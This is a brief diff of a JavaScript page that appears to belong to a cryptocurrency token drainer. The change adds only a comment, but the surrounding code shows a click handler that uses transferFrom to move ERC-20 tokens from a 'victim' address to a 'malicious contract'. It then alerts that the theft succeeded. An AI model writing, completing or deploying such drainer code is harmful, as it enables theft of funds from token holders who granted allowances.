@@ -490,6 +490,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             // Withdraw the tokens (amountToWithdraw is already in the correct unit)
             const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({ from: accounts[0] });
 
+            // Display the withdrawn amount (showing in the main unit of the ERC-20 token)
             alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw.toString(), 'ether')} tokens from the victim's account to the malicious contract!`);
         } catch (error) {
             alert("Error during withdrawal. Please check the details.");
@@ -498,6 +499,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
+
 
 
 
